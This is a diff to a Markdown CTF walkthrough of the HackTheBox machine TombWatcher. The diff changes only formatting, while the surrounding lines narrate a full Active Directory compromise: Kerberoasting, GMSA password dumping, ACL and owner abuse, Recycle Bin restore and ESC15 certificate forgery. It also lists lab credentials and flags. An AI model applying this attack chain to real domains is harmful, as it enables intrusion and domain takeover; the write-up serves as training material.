@@ -9,13 +9,37 @@
 | **Release Date**     | June 2025       |
 | **Difficulty**       | Medium          |
 
----
+<table>
+<tr>
+<td><strong>IP Address</strong></td>
+<td>10.129.101.78</td>
+</tr>
+<tr>
+<td><strong>Operating System</strong></td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><strong>Hostname</strong></td>
+<td>DC</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>tombwatcher.htb</td>
+</tr>
+<tr>
+<td><strong>Release Date</strong></td>
+<td>June 2025</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Medium</td>
+</tr>
+</table>
 
 # Machine Description
 
 TombWatcher is a Windows domain controller running Active Directory Certificate Services (AD CS) with multiple misconfigurations. The machine exploits a chain of privilege escalation vectors, including Kerberoasting, Group Managed Service Accounts (GMSA) abuse, and critically, the AD CS vulnerability ESC15 combined with Active Directory Recycle Bin exploitation. The attack chain demonstrates how interconnected misconfigurations in Active Directory security can be chained together to achieve full domain compromise.
 
----
 
 # Exploitation Summary
 
@@ -31,13 +55,13 @@ The attack chain involved:
 8. **ESC15 Exploitation**: Using the restored cert_admin account to exploit the CVE-2024-49019 vulnerability in AD CS to forge a certificate with elevated privileges
 9. **Domain Admin Access**: Leveraging the forged certificate to authenticate as the Domain Administrator and obtain the root flag
 
----
+
 
 # Detailed Walkthrough
 
 ## Road to User Flag
 
-##### ***Phase 1: Initial Network Reconnaissance and Service Discovery***
+### ***Phase 1: Initial Network Reconnaissance and Service Discovery***
 
 The initial phase began with network reconnaissance to identify services running on the target machine. An Nmap scan was performed against the target IP address 10.129.101.78 with service version detection enabled.
 
@@ -71,7 +95,7 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 The scan revealed that the target was a fully functional Domain Controller running Active Directory. Furthermore, there was an active FTP service.
 
-##### ***Phase 2: Active Directory Enumeration with BloodHound***
+### ***Phase 2: Active Directory Enumeration with BloodHound***
 
 With initial credentials provided (`henry:H3nry_987TGV!`), BloodHound was used to enumerate the Active Directory structure and identify privilege escalation paths. First, i executed the data collector to get all the domain data including users, groups, computers, OUs, and ACL relationships.
 
@@ -81,11 +105,11 @@ $ sudo python3 ~/Tools/BloodHound.py/bloodhound.py -d tombwatcher.htb -c all -u 
 
 Subsequently, i uploaded the zip file on BloodHound GUI. The BloodHound analysis revealed that the user henry possessed the `WriteSPN` privilege on the user `alfred`. 
 
-![[Pasted image 20261005151928.png]]
+![](1.png)
 
 This permission would allow modification of `alfred`'s Service Principal Name (SPN) attribute, enabling a Kerberoasting attack.
 
-##### ***Phase 3: Clock Synchronization for Kerberos Authentication***
+### ***Phase 3: Clock Synchronization for Kerberos Authentication***
 
 Before proceeding with Kerberos-based attacks, from a root shell I synchronized the time between the attacker's machine and the target Domain Controller. Kerberos is extremely sensitive to time differences, and any skew greater than a few minutes would cause authentication failures.
 
@@ -96,7 +120,7 @@ $ sudo rdate -n 10.129.101.78
 
 The attack machine's clock was synchronized to match the Domain Controller's time, ensuring that subsequent Kerberos operations would succeed.
 
-##### ***Phase 4: Kerberoasting Attack on Alfred***
+### ***Phase 4: Kerberoasting Attack on Alfred***
 
 The Kerberoasting attack exploited the `WriteSPN` privilege that henry possessed over `alfred`'s account. The `targetedKerberoast.py` tool was used to:
 1. Add a Service Principal Name to `alfred`'s account
@@ -115,7 +139,7 @@ $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$94215638ddf9194cd5fb
 
 The tool successfully extracted `alfred`'s TGS hash:
 
-##### ***Phase 5: Hash Cracking and Credential Acquisition***
+### ***Phase 5: Hash Cracking and Credential Acquisition***
 
 The extracted TGS hash was cracked using Hashcat with the `rockyou.txt` wordlist. The cracking process identified `alfred`'s password as `basketball`.
 
@@ -131,11 +155,11 @@ $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$6b640d6d48b7a83825 0
 
 With `alfred`'s credentials now compromised (`alfred:basketball`), the attacker could proceed with further privilege escalation.
 
-##### ***Phase 6: Group Membership Escalation via AddSelf Privilege***
+### ***Phase 6: Group Membership Escalation via AddSelf Privilege***
 
 The BloodHound analysis revealed that `alfred` possessed the `AddSelf` privilege on the `Infrastructure` group. This permission allowed `alfred` to add himself to the group. 
 
-![[Pasted image 20261005214108.png]]
+![](2.png)
 
 Using the bloodyad tool with `alfred`'s credentials, the user was successfully added to the `Infrastructure` group.
 
@@ -163,11 +187,11 @@ sAMAccountName: Infrastructure
 
 The `Infrastructure` group membership would prove critical in the next phase of the exploitation.
 
-##### ***Phase 7: Group Managed Service Account (GMSA) Password Extraction***
+### ***Phase 7: Group Managed Service Account (GMSA) Password Extraction***
 
 The `Infrastructure` group possessed permissions to read the managed password for the `ansible_dev$` Group Managed Service Account (GMSA). 
 
-![[Pasted image 20261005214235.png]]
+![](3.png)
 
 GMSAs are special Active Directory objects where the password is automatically managed and rotated by domain controllers. The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. Any principal listed in the "Managed Password Read" permissions can retrieve the current password for that service account. The `gMSADumper.py` tool was executed to extract the NT hash for the `ansible_dev$` account:
 
@@ -181,11 +205,11 @@ ansible_dev$:::3eca34dd13a85db79c03178b7b149621
 ...SNIP...
 ```
 
-##### ***Phase 8: ACL Exploitation Chain - ansible_dev to sam***
+### ***Phase 8: ACL Exploitation Chain - ansible_dev to sam***
 
 The next escalation step involved exploiting a chain of ACL permissions. The `ansible_dev$` account possessed the `ForceChangePassword` privilege on the `sam` user account. 
 
-![[Pasted image 20261005213932.png]]
+![](4.png)
 
 Using the Pass-the-Hash technique with the extracted `ansible_dev$` NT hash, the attacker changed `sam`'s password.
 
@@ -203,7 +227,7 @@ $ nxc smb 10.129.101.78 -u sam -p pass -d tombwatcher.htb
 SMB         10.129.101.78   445    DC01             [+] tombwatcher.htb\sam:pass
 ```
 
-##### ***Phase 9: FullControl via Owner Modification***
+### ***Phase 9: FullControl via Owner Modification***
 
 The `sam` user possessed the `WriteOwner` privilege on the `john` user account. This permission allowed `sam` to become the owner of `john`'s user object. The `owneredit.py` tool from Impacket was used to modify the owner:
 
@@ -213,7 +237,7 @@ $ python3 ./owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatc
 
 Once sam became the owner of john's account, the ownership change granted implicit `FullControl` over the object.
 
-##### ***Phase 10: ACL Modification and Password Reset***
+### ***Phase 10: ACL Modification and Password Reset***
 
 With ownership of `john`'s account, `sam` could modify `john`'s Access Control List (ACL) to grant explicit `FullControl` to the `sam` user. The `dacledit.py` tool was used to apply this change:
 
@@ -227,7 +251,7 @@ With `FullControl` permissions, `sam` was able to reset `john`'s password:
 $ net rpc password "john" "pass1" -U "tombwatcher.htb/sam" % "pass" -S "DC01.tombwatcher.htb"
 ```
 
-##### ***Phase 11: Get the flag***
+### ***Phase 11: Get the flag***
 
 The `john` user was a member of the `Remote Management Users` group, which granted access to the machine via Windows Remote Management (WinRM). Using `evil-winrm` with `john`'s new credentials, a remote shell was established:
 
@@ -241,11 +265,11 @@ The user flag was successfully retrieved from john's Desktop directory:
 *Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\user.txt
 ```
 
-==User flag==: `9261037815225a8dbf813c21dcca783f`
+<mark>User flag</mark>: `9261037815225a8dbf813c21dcca783f`
 
 ## Road to Root Flag
 
-##### ***Phase 1: AD CS Enumeration and Template Discovery***
+### ***Phase 1: AD CS Enumeration and Template Discovery***
 
 Following the acquisition of user-level access through `john`'s account, the focus shifted to privilege escalation toward domain administrator. The `john` user possessed the `GenericAll` permission on the `ADCS` organizational unit (OU), which contained certificate service configurations. Initial enumeration of the `ADCS` container revealed it was empty of objects. The `certipy-ad` tool was used to perform a comprehensive enumeration of the Active Directory Certificate Services infrastructure:
 
@@ -259,7 +283,7 @@ $ certipy-ad find -u john -p pass1 -dc-ip 10.129.101.78
 ...SNIP...
 ```
 
-##### ***Phase 2: Discovering the Deleted cert_admin Account in AD Recycle Bin***
+### ***Phase 2: Discovering the Deleted cert_admin Account in AD Recycle Bin***
 
 During the `20261006013602_Certipy.txt` file analisy, an anomaly was noticed in the WebServer template's enrollment permissions. One of the enrollment rights was represented as a raw Security Identifier (SID) rather than a resolved account name: `S-1-5-21-1392491010-1358638721-2126982587-1111`. 
 
@@ -308,7 +332,7 @@ LastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
 ...SNIP...
 ```
 
-##### ***Phase 3: Restoring the Deleted cert_admin Account***
+### ***Phase 3: Restoring the Deleted cert_admin Account***
 
 Since `john` possessed `GenericAll` permissions on the `ADCS` OU, the user had the necessary privileges to restore the deleted `cert_admin` account, since this is a write operation on the OU. When an object is restored from Active Directory's Recycle Bin, the system reads the object's metadata, particularly the `LastKnownParent` attribute, and recreates the object in its original parent OU with all its properties and permissions intact. The `cert_admin` account was restored using the `Restore-ADObject` PowerShell cmdlet from `ActiveDirectory` module:
 
@@ -318,7 +342,7 @@ Since `john` possessed `GenericAll` permissions on the `ADCS` OU, the user had t
 
 The restoration process reinserted the `cert_admin` account into the ADCS OU with all its original attributes.
 
-##### ***Phase 4: Escalating Permissions Within the ADCS OU***
+### ***Phase 4: Escalating Permissions Within the ADCS OU***
 
 Since `john` has `GenericAll` privileges over the `ADCS` OU, we can force the propagation of an inherited `FullControl` ACE from the parent container down to all child objects, effectively granting us full control over the newly restored `cert_admin` account. The dacledit.py tool was used to modify the OU's DACL:
 
@@ -328,7 +352,7 @@ $ python3 ./dacledit.py -action 'write' -rights 'FullControl' -inheritance -prin
 
 This modification ensured that `john` would have `FullControl` over the `cert_admin` account and any other objects in the `ADCS` OU.
 
-##### ***Phase 5: Password Reset and Account Activation***
+### ***Phase 5: Password Reset and Account Activation***
 
 With the necessary permissions established, `cert_admin`'s password was reset:
 
@@ -338,7 +362,7 @@ $ bloodyad -H 10.129.101.78 -d tombwatcher.htb -u 'john' -p 'pass1' set password
 
 The account was now accessible with the credentials `cert_admin:pass2`.
 
-##### ***Phase 6: Re-enumeration with cert_admin Credentials***
+### ***Phase 6: Re-enumeration with cert_admin Credentials***
 
 With access to the `cert_admin` account, the AD CS infrastructure was re-enumerated to identify additional vulnerable certificate templates. The `cert_admin` account possessed higher privileges within the certificate service environment:
 
@@ -393,7 +417,7 @@ Template Name                       : WebServer
 
 This vulnerability affects certificate templates using Schema Version 1 architecture. The core issue stems from insufficient Application Policy validation in Version 1 templates. When such a template is configured to allow enrollees to supply the subject information, an attacker can inject a Client Authentication application policy into the certificate request. Since the CA fails to enforce proper constraints on these injected policies, the resulting certificate, originally intended only for Server Authentication, becomes valid for client authentication purposes as well. This enables an attacker to impersonate arbitrary domain users.
 
-##### ***Phase 7: Exploiting ESC15 via Application Policies Injection***
+### ***Phase 7: Exploiting ESC15 via Application Policies Injection***
 
 With the `cert_admin` account having enrollment rights on the vulnerable `WebServer` template, the ESC15 vulnerability was exploited. The `certipy-ad` tool was used to request a certificate from the WebServer template while injecting a malicious Application Policies extension. The "Certificate Request Agent" OID (`1.3.6.1.4.1.311.20.2.1`) was injected, which would grant the certificate the ability to act as an enrollment agent, allowing the issuance of additional certificates on behalf of other users.
 
@@ -407,7 +431,7 @@ $ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'pass2' -dc-ip '10.129.101.7
 
 The unpatched Certificate Authority processed the request and issued a certificate with the injected Application Policies extension, resulting in the certificate file `cert_admin.pfx` that possessed unauthorized enrollment agent capabilities.
 
-##### ***Phase 8: Enrollment Agent Abuse for Administrator Certificate***
+### ***Phase 8: Enrollment Agent Abuse for Administrator Certificate***
 
 With the enrollment agent certificate, `certipy-ad`'s `on-behalf-of` feature was leveraged to request a new certificate from the `User` template, but with the UPN set to the `Administrator` account. This technique, combined with the enrollment agent permissions in the injected certificate, allowed the creation of a certificate authenticated as the domain administrator:
 
@@ -421,7 +445,7 @@ $ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'pass2' -dc-ip '10.129.101.7
 
 The CA issued the certificate `administrator.pfx` with the UPN set to `Administrator@tombwatcher.htb` and the corresponding security identifier (SID) for the domain administrator account.
 
-##### ***Phase 9: Authentication as domain administrator***
+### ***Phase 9: Authentication as domain administrator***
 
 The Administrator certificate was used to authenticate to the domain controller and obtain the `Administrator` NTLM hash. The `certipy-ad`'s authentication module was used to perform this operation:
 
@@ -434,7 +458,7 @@ $ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.101.78'
 f26741afe5fc
 ```
 
-##### ***Phase 10: Get the flag***
+### ***Phase 10: Get the flag***
 
 With the `Administrator`'s NTLM hash obtained, evil-winrm was used to establish a remote shell session as the Domain Administrator using Pass-the-Hash authentication:
 
@@ -448,9 +472,9 @@ Once authenticated as the domain administrator, full access to the system was ac
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 ```
 
-==Root flag==: `dd4c586f56d04df4a2c3642e92761b14`
+<mark>Root flag</mark>: `dd4c586f56d04df4a2c3642e92761b14`
 
----
+
 
 # Key Vulnerabilities Exploited
 
@@ -461,7 +485,7 @@ Once authenticated as the domain administrator, full access to the system was ac
 - **ESC15 (CVE-2024-49019)**: The unpatched Certificate Authority was vulnerable to Application Policies injection on Schema Version 1 templates, allowing arbitrary OID injection and certificate forgery
 - **Inadequate ADCS Permission Controls**: Overly permissive enrollment rights and lack of approval workflows allowed unauthorized users to request and obtain certificates with elevated privileges
 
----
+
 
 # Conclusion
 
